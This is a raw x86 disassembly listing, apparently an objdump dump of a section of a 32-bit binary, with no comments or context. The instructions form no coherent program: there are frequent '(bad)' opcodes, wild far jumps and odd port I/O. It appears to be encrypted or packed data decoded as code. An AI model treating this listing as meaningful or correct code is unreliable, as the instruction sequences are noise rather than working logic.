  420d09:	xor    bl,BYTE PTR [eax+0x2b]
  420d0c:	cdq    
  420d0d:	daa    
  420d0e:	add    ebp,ebp
  420d10:	mov    WORD PTR [ecx],?
  420d12:	pop    edx
  420d13:	cld    
  420d14:	in     al,dx
  420d15:	dec    esp
  420d16:	xchg   esi,eax
  420d17:	jo     0x420ca4
  420d19:	xchg   ebx,eax
  420d1a:	js     0x420d3f
  420d1c:	cmp    DWORD PTR [ecx-0x10],esp
  420d1f:	cmp    ecx,DWORD PTR [ecx+0x46b9f5b6]
  420d25:	mov    ebp,0x5fc155a3
  420d2a:	enter  0xac07,0xf6
  420d2e:	jmp    0x420d44
  420d30:	(bad)  
  420d31:	push   eax
  420d32:	xor    cl,BYTE PTR ds:0xc6539fb5
  420d38:	xchg   ebx,eax
  420d39:	jmp    0x420d75
  420d3b:	sub    DWORD PTR [eax+esi*1-0x152f5fe5],0x61c16a2b
  420d46:	ja     0x420d56
  420d48:	mov    edi,0x3d82cb3
  420d4d:	lea    esp,[edx+ecx*4+0x37734bdd]
  420d54:	ret    0x5390
  420d57:	test   eax,0xc05cb18
  420d5c:	jns    0x420d6b
  420d5e:	mov    edi,0x7c954c51
  420d63:	mov    eax,0x7ae874ce
  420d68:	cld    
  420d69:	fdivr  DWORD PTR [esi+0x2d0e1b91]
  420d6f:	jge    0x420dce
  420d71:	fwait
  420d72:	push   cs
  420d73:	rol    BYTE PTR ds:0x30130ca3,0xd4
  420d7a:	lods   al,BYTE PTR ds:[esi]
  420d7b:	pop    ds
  420d7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d7d:	cli    
  420d7e:	sbb    eax,0x6f460d29
  420d83:	xchg   ebx,eax
  420d84:	inc    edi
  420d85:	jp     0x420d9e
  420d87:	add    al,0x5
  420d89:	mov    BYTE PTR [esi+0x4f],0x6b
  420d8d:	or     al,0x9e
  420d8f:	rcl    BYTE PTR [edx+ecx*4],cl
  420d92:	jecxz  0x420d8d
  420d94:	(bad)  
  420d95:	(bad)  
  420d96:	push   ebx
  420d97:	push   esp
  420d98:	pushf  
  420d99:	retf   
  420d9a:	mov    cl,0x48
  420d9c:	dec    eax
  420d9d:	push   cs
  420d9e:	push   esp
  420d9f:	repnz push cs
  420da1:	add    eax,0xfa20b973
  420da6:	cli    
  420da7:	mov    al,0x1c
  420da9:	sbb    DWORD PTR [ebx+0x44],ebp
  420dac:	push   0xa644315e
  420db1:	mov    ah,0xe0
  420db3:	jnp    0x420dfb
  420db5:	mov    ds:0x588b2945,al
  420dba:	pop    ss
  420dbb:	mov    ecx,0xb318cd7
  420dc0:	fmul   DWORD PTR [edx+0x49]
  420dc3:	inc    BYTE PTR [edx-0x3b7cb5f7]
  420dc9:	pop    ss
  420dca:	test   DWORD PTR [edx-0x46cde0fc],ecx
  420dd0:	or     DWORD PTR [edi-0x7c1c172a],eax
  420dd6:	dec    ebp
  420dd7:	and    DWORD PTR [ecx],eax
  420dd9:	xchg   ecx,eax
  420dda:	jnp    0x420de2
  420ddc:	pop    ecx
  420ddd:	sub    BYTE PTR [ecx+0x54],ch
  420de0:	cmp    eax,0xa6cae83e
  420de5:	inc    esp
  420de6:	adc    al,0xcc
  420de8:	sub    dh,0xfc
  420deb:	cdq    
  420dec:	xchg   edi,eax
  420ded:	repnz push ds
  420def:	int3   
  420df0:	jmp    0xfd4cbfe3
  420df5:	sahf   
  420df6:	scas   eax,DWORD PTR es:[edi]
  420df7:	cmp    bh,dh
  420df9:	retf   
  420dfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420dfb:	push   ebp
  420dfc:	push   esp
  420dfd:	sub    esp,DWORD PTR [eax-0x6]
  420e00:	cmp    al,cl
  420e02:	stos   DWORD PTR es:[edi],eax
  420e03:	xor    al,0x8f
  420e05:	xchg   edx,eax
  420e06:	push   edx
  420e07:	sar    esi,1
  420e09:	das    
  420e0a:	jns    0x420e6a
  420e0c:	sub    esi,DWORD PTR ds:0xa57ffcf8
  420e12:	pop    edx
  420e13:	les    ebx,FWORD PTR [edi-0x29292de1]
  420e19:	sbb    ch,BYTE PTR [edx]
  420e1b:	sbb    DWORD PTR [eax-0x3d],edx
  420e1e:	jnp    0x420e0f
  420e20:	imul   ecx,DWORD PTR gs:[eax],0x62504692
  420e27:	cmp    eax,0xffffffd5
  420e2a:	xor    DWORD PTR [edi-0x6b9e0ded],esp
  420e30:	jg     0x420dd2
  420e32:	stos   DWORD PTR es:[edi],eax
  420e33:	or     BYTE PTR [edi],cl
  420e35:	mov    edx,DWORD PTR [eax]
  420e37:	shl    BYTE PTR [ebx],cl
  420e39:	shl    BYTE PTR [edx-0x21],cl
  420e3c:	sahf   
  420e3d:	sub    bh,BYTE PTR [ecx-0x64]
  420e40:	xchg   esp,eax
  420e41:	std    
  420e42:	inc    ebp
  420e43:	fld    QWORD PTR [edx-0x2589bab3]
  420e49:	xor    edx,ecx
  420e4b:	and    BYTE PTR ds:0x94c9,bl
  420e50:	loope  0x420e68
  420e52:	push   ebp
  420e53:	test   al,0xbb
  420e55:	mov    eax,ds:0x2ecccc96
  420e5a:	mov    bh,0x34
  420e5c:	or     DWORD PTR ds:0xe6ff4943,ebx
  420e62:	test   eax,0x45dc6de8
  420e67:	int    0xb
  420e69:	sysenter 
  420e6b:	jns    0x420e41
  420e6d:	das    
  420e6e:	into   
  420e6f:	call   0xa054793d
  420e74:	loope  0x420e57
  420e76:	lea    ebx,[edi-0x6b]
  420e79:	add    ah,BYTE PTR [eax-0x2c]
  420e7c:	and    al,0x14
  420e7e:	data16 shl BYTE PTR [edx+0x6b4ed2c8],1
  420e85:	sub    DWORD PTR [esi+0x1d],esp
  420e88:	sahf   
  420e89:	or     eax,0x30454763
  420e8e:	or     DWORD PTR [ebp-0x19],esp
  420e91:	and    edi,ebp
  420e93:	rcr    DWORD PTR [eax+edx*8-0x3],0x6c
  420e98:	xchg   ecx,eax
  420e99:	jmp    0x420e3e
  420e9b:	and    al,0x22
  420e9d:	and    ecx,ecx
  420e9f:	dec    ebx
  420ea0:	call   0x5984:0x65c9393b
  420ea7:	ins    BYTE PTR es:[edi],dx
  420ea8:	cmp    eax,0x6663e4fd
  420ead:	nop
  420eae:	mov    edi,0xd99732a4
  420eb3:	scas   eax,DWORD PTR es:[edi]
  420eb4:	pusha  
  420eb5:	jne    0x420eb6
  420eb7:	jne    0x420f2c
  420eb9:	scas   eax,DWORD PTR es:[edi]
  420eba:	dec    edx
  420ebb:	call   0x8849d971
  420ec0:	out    0xa8,al
  420ec2:	in     al,dx
  420ec3:	cmp    eax,0xe3213f3a
  420ec8:	mov    edx,0x490b7510
  420ecd:	bound  esp,QWORD PTR [ecx+0x649bbf62]
  420ed3:	fisttp WORD PTR [esi]
  420ed5:	or     al,0x1a
  420ed7:	sbb    eax,0xb3f6a529
  420edc:	out    dx,al
  420edd:	mov    ecx,0xa02ba414
  420ee2:	repnz push eax
  420ee4:	jnp    0x420ebb
  420ee6:	push   0xffffffd7
  420ee8:	xchg   ebp,eax
  420ee9:	retf   
  420eea:	sbb    cl,dl
  420eec:	stos   DWORD PTR es:[edi],eax
  420eed:	in     al,0xd6
  420eef:	shr    DWORD PTR [ebp-0xa2562fa],cl
  420ef5:	clc    
  420ef6:	out    dx,al
  420ef7:	pushf  
  420ef8:	jne    0x420f0b
  420efa:	cmc    
  420efb:	scas   eax,DWORD PTR es:[edi]
  420efc:	icebp  
  420efd:	jmp    0xd83d0c15
  420f02:	lods   eax,DWORD PTR ds:[esi]
  420f03:	jmp    0x54de0748
  420f08:	outs   dx,DWORD PTR ds:[esi]
  420f09:	dec    ebx
  420f0a:	loop   0x420f56
  420f0c:	jmp    0xb2d1:0x167cd269
  420f13:	loopne 0x420f86
  420f15:	mov    DWORD PTR [edi-0x6a655cd2],ebx
  420f1b:	(bad)  
  420f1c:	in     al,dx
  420f1d:	pop    ds
  420f1e:	pop    ebp
  420f1f:	arpl   WORD PTR [edx-0x17ec9aa7],sp
  420f25:	jp     0x420f7a
  420f27:	or     esi,0x15
  420f2a:	pop    edi
  420f2b:	ins    DWORD PTR es:[edi],dx
  420f2c:	ret    0x63b5
  420f2f:	or     ah,BYTE PTR [ecx+0x1a4fa0b9]
  420f35:	jns    0x420f5c
  420f37:	adc    eax,0x23ac0bf1
  420f3c:	mov    edx,?
  420f3e:	leave  
  420f3f:	pop    ebx
  420f40:	inc    ebp
  420f41:	(bad)  [edx-0x7dba86ac]
  420f47:	push   eax
  420f48:	enter  0x4c80,0x7b
  420f4c:	out    dx,eax
  420f4d:	stos   DWORD PTR es:[edi],eax
  420f4e:	not    BYTE PTR [esi]
  420f50:	xor    eax,0x1849b1a7
  420f55:	fisubr DWORD PTR [edx]
  420f57:	xor    eax,0xd2ea94b2
  420f5c:	sahf   
  420f5d:	pop    ds
  420f5e:	int    0x1e
  420f60:	clc    
  420f61:	push   es
  420f62:	outs   dx,DWORD PTR ds:[esi]
  420f63:	inc    ecx
  420f64:	std    
  420f65:	pushf  
  420f66:	movq   QWORD PTR [edx+0x71f59c7a],mm4
  420f6d:	mov    ebp,fs
  420f6f:	cmp    ecx,edx
  420f71:	xor    ebp,DWORD PTR [ebx+0x12]
  420f74:	inc    ebp
  420f75:	icebp  
  420f76:	sbb    BYTE PTR [esi+eiz*1+0x717bfb4e],dh
  420f7d:	xchg   DWORD PTR [edx-0x23216a4b],eax
  420f83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f84:	sub    BYTE PTR [ebp-0x760c89db],dl
  420f8a:	lea    esp,[ebp+0x10f9dae4]
  420f90:	test   BYTE PTR [esi],ch
  420f92:	pop    esp
  420f93:	or     ebx,DWORD PTR [ebx]
  420f95:	pop    ds
  420f96:	pop    edi
  420f97:	(bad)  
  420f98:	mov    ebp,0xbb5d4555
  420f9d:	hlt    
  420f9e:	add    DWORD PTR [ebx-0x4],edx
  420fa1:	outs   dx,DWORD PTR ds:[esi]
  420fa2:	cmp    DWORD PTR [esi-0x555a67a7],ebx
  420fa8:	jae    0x420f88
  420faa:	cmp    dh,BYTE PTR [ebx]
  420fac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fad:	into   
  420fae:	push   eax
  420faf:	push   0x9
  420fb1:	add    esi,esi
  420fb3:	mov    fs,WORD PTR [ebp+0x1eed06a4]
  420fb9:	add    BYTE PTR [eax+0xb],bl
  420fbc:	add    al,0xbe
  420fbe:	jmp    0x91b2573f
  420fc3:	or     al,0xc6
  420fc5:	es add al,0x5e
  420fc8:	push   edx
  420fc9:	fiadd  WORD PTR [ecx-0x69]
  420fcc:	cmp    ecx,DWORD PTR [ebx-0x5d24f659]
  420fd2:	push   ebx
  420fd3:	push   es
  420fd4:	ss daa 
  420fd6:	jb     0x421048
  420fd8:	imul   ecx,DWORD PTR [ebx+ebp*4-0x5423b3a7],0xd1e9370f
  420fe3:	add    eax,0xbd1d0060
  420fe8:	xor    BYTE PTR [eax],dh
  420fea:	fmul   QWORD PTR [edx-0x35]
  420fed:	je     0x42100b
  420fef:	push   edi
  420ff0:	adc    eax,0x37bd11c9
  420ff5:	sub    bl,BYTE PTR [edx]
  420ff7:	xchg   esp,eax
  420ff8:	shr    DWORD PTR [ecx+0x46],cl
  420ffb:	das    
  420ffc:	push   eax
  420ffe:	ins    BYTE PTR es:[edi],dx
  420fff:	jbe    0x420f8b
  421001:	mov    ebp,0xc7c2136f
  421006:	inc    ecx
  421007:	iret   
  421008:	sti    
  421009:	cmp    BYTE PTR [edi],bl
  42100b:	popf   
  42100c:	iret   
  42100d:	iret   
  42100e:	leave  
  42100f:	and    DWORD PTR [edx],eax
  421011:	pop    eax
  421012:	stc    
  421013:	cmc    
  421014:	xchg   ecx,eax
  421015:	cmc    
  421016:	popf   
  421017:	lea    esp,[esi+0x172465a8]
  42101d:	adc    eax,0x8c8fa29e
  421022:	xchg   edi,eax
  421023:	or     al,0xac
  421025:	aam    0xd5
  421027:	fisttp DWORD PTR ds:0x586af066
  42102d:	leave  
  42102e:	scas   al,BYTE PTR es:[edi]
  42102f:	ds push cs
  421031:	fwait
  421032:	iret   
  421033:	or     ebx,esi
  421035:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421036:	pop    ss
  421037:	fidiv  DWORD PTR [ebp-0x39609367]
  42103d:	mov    ch,0x13
  42103f:	xchg   ebp,eax
  421040:	jmp    0x420fde
  421042:	aad    0xa4
  421044:	(bad)  
  421045:	mov    ebp,0x3f30b74a
  42104a:	pop    esp
  42104b:	and    dh,dl
  42104d:	popa   
  42104e:	(bad)  
  42104f:	out    dx,eax
  421050:	lock test al,0x89
  421053:	fst    st(5)
  421055:	lods   al,BYTE PTR ds:[esi]
  421056:	stos   DWORD PTR es:[edi],eax
  421057:	mov    ebp,0x68185d98
  42105c:	xchg   edx,eax
  42105d:	gs iret 
  42105f:	call   0x8716:0xc95b7bcb
  421066:	dec    ebx
  421067:	loopne 0x421021
  421069:	or     ebp,DWORD PTR [edx+0xaecd001]
  42106f:	ins    BYTE PTR es:[edi],dx
  421070:	test   BYTE PTR [ecx+eiz*2-0x33],cl
  421074:	adc    edi,DWORD PTR [ebx+0x2b]
  421077:	jno    0x4210a5
  421079:	xchg   edi,eax
  42107a:	fidivr DWORD PTR [eax-0x7f044bd1]
  421080:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421081:	cld    
  421082:	lahf   
  421083:	adc    ecx,DWORD PTR ds:0xa4fad406
  421089:	scas   eax,DWORD PTR es:[edi]
  42108a:	push   ecx
  42108b:	and    eax,0xe8f26a57
  421090:	inc    esp
  421091:	ss mov dl,0xec
  421094:	adc    al,BYTE PTR [ecx+0x62c79d04]
  42109a:	repnz aam 0xda
  42109d:	retf   
  42109e:	xor    ebx,ecx
  4210a0:	add    al,0x92
  4210a2:	loop   0x4210c9
  4210a4:	data16 jb 0x42103c
  4210a7:	ins    BYTE PTR es:[edi],dx
  4210a8:	rcl    DWORD PTR [esi-0x10],0x4b
  4210ac:	adc    BYTE PTR fs:[ecx-0x33b45c7f],ch
  4210b3:	pusha  
  4210b4:	push   esp
  4210b5:	add    eax,DWORD PTR [ebp-0x23]
  4210b8:	mov    cl,0xa8
  4210ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4210bb:	cmp    eax,0x351529a1
  4210c0:	pop    ebx
  4210c1:	add    DWORD PTR [ecx+0x36],esp
  4210c4:	mov    BYTE PTR [esi],dl
  4210c6:	or     al,0xdf
  4210c8:	jns    0x42109e
  4210ca:	and    dh,ch
  4210cc:	in     al,0xeb
  4210ce:	mov    edi,0x1a538474
  4210d3:	icebp  
  4210d4:	sub    bh,BYTE PTR [eax-0x3bb0c91]
  4210da:	std    
  4210db:	clc    
  4210dc:	test   BYTE PTR [ecx-0x6a],ch
  4210df:	mov    edi,0xa7fe1913
  4210e4:	or     al,0x8d
  4210e6:	inc    edi
  4210e7:	add    ebx,DWORD PTR [eax+0x45]
  4210ea:	push   DWORD PTR ds:0xf0c721d9
  4210f0:	fdivr  DWORD PTR es:[esi+0x1a]
  4210f4:	mov    al,ds:0xec2b49c2
  4210f9:	in     al,dx
  4210fa:	cmp    DWORD PTR [ecx+0x22d40ea7],edx
  421100:	mov    edx,0x17ecd7b
  421105:	xor    BYTE PTR [ebp-0x2f370004],ah
  42110b:	rcl    DWORD PTR [edi+0x47],cl
  42110e:	xchg   esi,eax
  42110f:	push   0x4af1c66
  421114:	adc    BYTE PTR [eax+0x15],0x55
  421118:	jp     0x42118c
  42111a:	enter  0xc051,0x94
  42111e:	dec    ebp
  42111f:	adc    al,0x5e
  421121:	mov    eax,ds:0x4e780f55
  421126:	lods   eax,DWORD PTR ds:[esi]
  421127:	mov    bl,0xc8
  421129:	sbb    BYTE PTR [ecx+0x4c00330c],ah
  42112f:	leave  
  421130:	push   ebx
  421131:	shl    DWORD PTR [eax+0x65f0cc38],0x23
  421138:	fimul  WORD PTR [ecx]
  42113a:	or     bl,BYTE PTR [eax]
  42113c:	icebp  
  42113d:	cmp    bh,BYTE PTR [edi+0x137010e6]
  421143:	pop    edx
  421144:	sbb    eax,0x8639684d
  421149:	(bad)  
  42114a:	sahf   
  42114b:	and    ebx,DWORD PTR [edi]
  42114d:	and    DWORD PTR [esi-0x2],edi
  421150:	jp     0x421154
  421152:	test   DWORD PTR es:0xea1eb2f3,esp
  421159:	mov    bh,0xbe
  42115b:	mov    ds:0xaadd074a,eax
  421160:	lahf   
  421161:	sti    
  421162:	push   cs
  421163:	jecxz  0x421164
  421165:	or     al,0x7b
  421167:	into   
  421168:	inc    edx
  421169:	retf   0x5402
  42116c:	sbb    eax,0xa60eee34
  421171:	mov    ds:0x48adf7aa,al
  421176:	fisttp DWORD PTR [edx]
  421178:	add    BYTE PTR [edi-0x528fa443],ah
  42117e:	sbb    BYTE PTR [edi-0x5722676d],ch
  421184:	add    DWORD PTR [eax+edi*8],edi
  421187:	and    al,0x3a
  421189:	mov    ch,0xa7
  42118b:	mov    ds:0x56b8676a,al
  421190:	fwait
  421191:	adc    ah,cl
  421193:	in     eax,0x90
  421195:	jne    0x4211d4
  421197:	mov    ?,WORD PTR [ebx+0xf23a766]
  42119d:	test   al,0x1d
  42119f:	and    al,0xb
  4211a1:	cmp    eax,0x4c131f51
  4211a6:	mov    DWORD PTR [ebx-0x6a15d935],0x1136c5af
  4211b0:	out    dx,al
  4211b1:	pop    ds
  4211b2:	mov    edi,0x6c22671e
  4211b7:	in     eax,dx
  4211b8:	out    dx,al
  4211b9:	out    dx,eax
  4211ba:	test   DWORD PTR [eax+0x78],ebx
  4211bd:	lock or al,dl
  4211c0:	xor    eax,0xf480be3c
  4211c5:	imul   esp,DWORD PTR [ebp+0x5c],0x1e6ad17b
  4211cc:	dec    edx
  4211cd:	div    BYTE PTR [ebx]
  4211cf:	jl     0x42118b
  4211d1:	adc    DWORD PTR [ebx-0xe46b811],ebx
  4211d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211d8:	lahf   
  4211d9:	push   ebp
  4211da:	scas   al,BYTE PTR es:[edi]
  4211db:	or     DWORD PTR [eax-0x15200175],esi
  4211e1:	mov    dl,0x7f
  4211e3:	outs   dx,DWORD PTR ds:[esi]
  4211e4:	dec    esp
  4211e6:	inc    edi
  4211e7:	js     0x4211d1
  4211e9:	sbb    edi,DWORD PTR [ecx+edx*8]
  4211ec:	mov    cl,0x88
  4211ee:	push   eax
  4211ef:	jo     0x4211bb
  4211f1:	(bad)  
  4211f2:	adc    eax,0x301c3473
  4211f7:	sbb    BYTE PTR [edi],ah
  4211f9:	hlt    
  4211fa:	xor    DWORD PTR [edx+0xe],esp
  4211fd:	pop    ss
  4211fe:	loop   0x42125f
  421200:	xchg   ebx,eax
  421201:	cmp    DWORD PTR [edx],esp
  421203:	les    ebp,FWORD PTR [edx+edx*8]
  421206:	adc    BYTE PTR [ebx-0x5668ed1b],al
  42120c:	or     al,BYTE PTR [esi-0x14]
  42120f:	push   ebx
  421210:	jecxz  0x421255
  421212:	repz jb 0x421275
  421215:	inc    edx
  421216:	mov    dh,0x1a
  421218:	sbb    BYTE PTR [ebx-0x5],0x15
  42121c:	ins    DWORD PTR es:[edi],dx
  42121d:	jnp    0x421271
  42121f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421220:	or     DWORD PTR [ebp+0xb6e9e4b],edi
  421226:	ss sub eax,0x7054ed03
  42122c:	retf   0x6173
  42122f:	out    0x9,eax
  421231:	sub    eax,0xafb85cf3
  421236:	into   
  421237:	mov    bh,0x2b
  421239:	shl    ebp,cl
  42123b:	fmul   QWORD PTR [ebp+0x74]
  42123e:	dec    ecx
  42123f:	mov    cs,WORD PTR [esi]
  421241:	test   al,0x51
  421243:	mov    edx,0x874d6888
  421248:	pusha  
  421249:	xor    eax,0x7cad1e3d
  42124e:	lds    ecx,FWORD PTR [esi-0x9]
  421251:	push   0xfffffffd
  421253:	jmp    0x421264
  421255:	lahf   
  421256:	or     al,dl
  421258:	dec    ebx
  421259:	retf   
  42125a:	outs   dx,BYTE PTR ds:[esi]
  42125b:	jg     0x421220
  42125d:	xchg   BYTE PTR [ecx],ch
  42125f:	(bad)  
  421260:	adc    al,0xe9
  421262:	or     eax,DWORD PTR [ecx+0x30]
  421265:	adc    DWORD PTR [ebx-0x74bd2a67],ecx
  42126b:	jnp    0x4212d4
  42126d:	stc    
  42126e:	pusha  
  42126f:	jl     0x4212d5
  421271:	dec    ecx
  421272:	push   ss
  421273:	mov    ch,0x66
  421275:	adc    eax,0x690de8cd
  42127a:	dec    ebp
  42127b:	out    0x1,al
  42127d:	pusha  
  42127e:	into   
  42127f:	imul   BYTE PTR [edx+ecx*8-0x75]
  421283:	jge    0x4212b1
  421285:	mov    bl,0x76
  421287:	stc    
  421288:	dec    ebx
  421289:	iret   
  42128a:	and    BYTE PTR [eax-0x984935d],dh
  421290:	ins    BYTE PTR es:[edi],dx
  421291:	imul   edi,ebp,0x5
  421294:	test   eax,0xefc2774
  421299:	jg     0x421255
  42129b:	test   al,0x19
  42129d:	jne    0x4212b0
  42129f:	shl    DWORD PTR [ecx],cl
  4212a1:	scas   eax,DWORD PTR es:[edi]
  4212a2:	push   ss
  4212a3:	jl     0x421236
  4212a5:	cwde   
  4212a6:	sbb    ecx,DWORD PTR [edi]
  4212a8:	xchg   esp,eax
  4212a9:	mov    dh,0x19
  4212ab:	ins    BYTE PTR es:[edi],dx
  4212ac:	(bad)  
  4212ad:	mov    ebp,esi
  4212af:	inc    ebx
  4212b0:	ins    DWORD PTR es:[edi],dx
  4212b1:	xor    esi,DWORD PTR [edx-0x16319826]
  4212b7:	or     DWORD PTR [ebx-0x75e42968],edx
  4212bd:	xlat   BYTE PTR ds:[ebx]
  4212be:	push   ecx
  4212bf:	pop    es
  4212c0:	in     eax,dx
  4212c1:	sub    esp,ebp
  4212c3:	mov    edx,0xd85456c6
  4212c8:	cmc    
  4212c9:	sbb    al,0xb2
  4212cb:	and    DWORD PTR [edx+edi*2],esi
  4212ce:	and    dl,0xff
  4212d1:	aam    0x13
  4212d3:	out    0x7,al
  4212d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212d6:	inc    esp
  4212d7:	inc    ebx
  4212d8:	aas    
  4212d9:	fdivr  QWORD PTR [edx]
  4212db:	add    DWORD PTR gs:[ebx+0xe49d67],ecx
  4212e2:	push   0x34ae5f63
  4212e7:	mov    DWORD PTR [edx+0x5bda96e7],0x5b8b0c3
  4212f1:	stos   DWORD PTR es:[edi],eax
  4212f2:	imul   edx,DWORD PTR [edx-0x52],0xfffffff0
  4212f6:	rol    DWORD PTR [ebp-0x5bc4fc2c],0xfe
  4212fd:	loopne 0x4212db
  4212ff:	mov    eax,ds:0xd9786b7e
  421304:	fsubr  QWORD PTR [edi+0x1d]
  421307:	aam    0x0
  421309:	aad    0x30
  42130b:	adc    al,0xb0
  42130d:	lods   al,BYTE PTR ds:[esi]
  42130e:	pop    esp
  42130f:	scas   al,BYTE PTR es:[edi]
  421310:	push   esi
  421311:	sar    DWORD PTR [edx-0x78dc6669],cl
  421317:	inc    edi
  421318:	in     eax,0x98
  42131a:	sbb    eax,0x9eca8a7f
  42131f:	mov    ah,0x8f
  421321:	mov    eax,ds:0xdf25eb20
  421326:	ret    
  421327:	scas   al,BYTE PTR es:[edi]
  421328:	and    BYTE PTR [edi+0x1bae5189],ch
  42132e:	sar    ebx,cl
  421330:	push   ebx
  421331:	xchg   ebp,eax
  421332:	push   eax
  421333:	adc    eax,0x3d9630c6
  421338:	pop    esi
  421339:	jmp    0x81842335
  42133e:	or     al,0xd6
  421340:	bswap  esi
  421342:	outs   dx,DWORD PTR ds:[esi]
  421343:	adc    ah,BYTE PTR [esi+0x68]
  421346:	pushf  
  421347:	mul    BYTE PTR [ebp+0x4e64128c]
  42134d:	(bad)  
  42134e:	sbb    BYTE PTR cs:[edx-0x45],bl
  421352:	lods   al,BYTE PTR ds:[esi]
  421353:	mov    ebp,0x77df8f80
  421358:	mov    ecx,0xf2370b00
  42135d:	add    DWORD PTR [esi],ebx
  42135f:	adc    al,0xdf
  421361:	(bad)  [edi+0x26]
  421364:	ret    0x9945
  421367:	scas   eax,DWORD PTR es:[edi]
  421368:	in     al,0x35
  42136a:	(bad)  
  42136b:	ss jmp 0x7c9d3fed
  421371:	and    eax,DWORD PTR [ebp-0x3]
  421374:	xchg   DWORD PTR [ebx+ebx*4],edi
  421377:	mov    ebp,0xb5cadfc9
  42137c:	aas    
  42137d:	test   eax,0x5deae602
  421382:	or     al,0x33
  421384:	mov    WORD PTR [ecx],es
  421386:	mov    edi,0xd3778039
  42138b:	sahf   
  42138c:	mov    eax,0x472a9eed
  421391:	(bad)  
  421392:	repz xchg esi,eax
  421394:	das    
  421395:	cli    
  421396:	inc    ebx
  421397:	mov    eax,ds:0x7277fb15
  42139c:	rcr    DWORD PTR [edi],0xad
  42139f:	inc    esi
  4213a0:	push   ds
  4213a1:	sub    al,0xf
  4213a3:	aam    0x9a
  4213a5:	loope  0x421402
  4213a7:	and    edi,DWORD PTR [ecx+0x3]
  4213aa:	lods   al,BYTE PTR ds:[esi]
  4213ab:	xchg   edx,eax
  4213ac:	stos   BYTE PTR es:[edi],al
  4213ad:	ins    DWORD PTR es:[edi],dx
  4213ae:	xchg   ebx,eax
  4213af:	pop    ebx
  4213b0:	scas   al,BYTE PTR es:[edi]
  4213b1:	bound  edx,QWORD PTR [edi+eax*2+0x1f]
  4213b5:	mov    eax,0xa58d943f
  4213ba:	jne    0x4213ca
  4213bc:	add    ch,BYTE PTR [edx-0x28]
  4213bf:	jne    0x42143a
  4213c1:	(bad)  
  4213c3:	xor    eax,0xe3cfe079
  4213c8:	popa   
  4213c9:	inc    ecx
  4213ca:	fwait
  4213cb:	stos   BYTE PTR es:[edi],al
  4213cc:	inc    DWORD PTR [esi+0x1b]
  4213cf:	fxch   st(6)
  4213d1:	pop    ebp
  4213d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213d3:	pop    esi
  4213d4:	push   ebp
  4213d5:	mov    esi,DWORD PTR [ebp+0x560df210]
  4213db:	aas    
  4213dc:	loope  0x4213ae
  4213de:	ret    0xb1fd
  4213e1:	dec    ebx
  4213e2:	inc    eax
  4213e3:	cmp    esi,DWORD PTR [ebx]
  4213e5:	sahf   
  4213e6:	scas   eax,DWORD PTR es:[edi]
  4213e7:	scas   eax,DWORD PTR es:[edi]
  4213e8:	or     ecx,DWORD PTR [ebx]
  4213ea:	xlat   BYTE PTR ds:[ebx]
  4213eb:	gs scas eax,DWORD PTR es:[edi]
  4213ed:	retf   0xd909
  4213f0:	sar    BYTE PTR [ecx+0x26],0xa0
  4213f4:	or     DWORD PTR [esi+0x134172be],0xffffffef
  4213fb:	stos   DWORD PTR es:[edi],eax
  4213fc:	dec    ebx
  4213fd:	adc    DWORD PTR [esi],edi
  4213ff:	add    edi,DWORD PTR [eax+0x5736cb85]
  421405:	dec    ebp
  421406:	test   al,0xeb
  421408:	mov    ds:0x12b4b5ef,eax
  42140d:	retf   0x6d0f
  421410:	imul   ebp,DWORD PTR [eax-0x9567a05],0xffffffde
  421417:	mulps  xmm1,XMMWORD PTR [edx-0x3]
  42141b:	in     al,dx
  42141c:	cdq    
  42141d:	arpl   ax,sp
  42141f:	xchg   esp,eax
  421420:	sub    DWORD PTR [eax],0xffffffb7
  421423:	mov    ds:0x489e69f1,al
  421428:	adc    eax,0x9d2a88f7
  42142d:	mov    ecx,0x5b5c2f7c
  421432:	sbb    eax,0x3ed868d2
  421437:	push   eax
  421438:	jmp    0xc375:0xf0fdb61b
  42143f:	in     al,0x21
  421441:	dec    esp
  421442:	inc    ecx
  421443:	add    eax,0x670f119f
  421448:	dec    edi
  421449:	outs   dx,DWORD PTR ds:[esi]
  42144a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42144b:	icebp  
  42144c:	ss lahf 
  42144e:	xor    DWORD PTR [ebp+0x6ac2f586],ebp
  421454:	lds    cx,DWORD PTR [esi-0x43]
  421458:	push   ds
  421459:	xor    al,0xad
  42145b:	pop    ebx
  42145c:	jle    0x4214a0
  42145e:	sbb    al,0x1b
  421460:	mov    ebp,0xc0ee485f
  421465:	add    DWORD PTR [esi+0x34],0x40
  421469:	data16 add BYTE PTR [esi],ah
  42146c:	mov    WORD PTR es:[ecx+0x20],fs
  421470:	or     eax,0xbc71565f
  421475:	sub    al,0x85
  421477:	inc    ecx
  421478:	xchg   ebx,eax
  421479:	jnp    0x421434
  42147b:	dec    ebp
  42147c:	and    DWORD PTR [edx+0x4fa30121],esp
  421482:	xor    edi,DWORD PTR [esi]
  421484:	(bad)  
  421485:	lock xchg esi,eax
  421487:	cld    
  421488:	jmp    0x9c9f:0x7388cd73
  42148f:	push   esi
  421490:	xor    al,0x82
  421492:	pop    edi
  421493:	jmp    0x7897:0xf04c1507
  42149a:	ss loop 0x421508
  42149d:	mov    bl,0x50
  42149f:	inc    DWORD PTR [ebp+0x4e]
  4214a2:	fcom   st(4)
  4214a4:	outs   dx,BYTE PTR ds:[esi]
  4214a5:	xchg   esp,eax
  4214a6:	inc    esp
  4214a7:	test   al,0x20
  4214a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214aa:	jle    0x4214b6
  4214ac:	mov    ds:0xb12b2a10,eax
  4214b1:	mov    al,ds:0x60d32972
  4214b6:	and    cl,BYTE PTR [ebx+eax*2]
  4214b9:	fadd   QWORD PTR [ebx]
  4214bb:	mov    WORD PTR [edi+0x9],?
  4214be:	imul   eax,DWORD PTR [edx-0x6a],0x862f748c
  4214c5:	xor    dl,cl
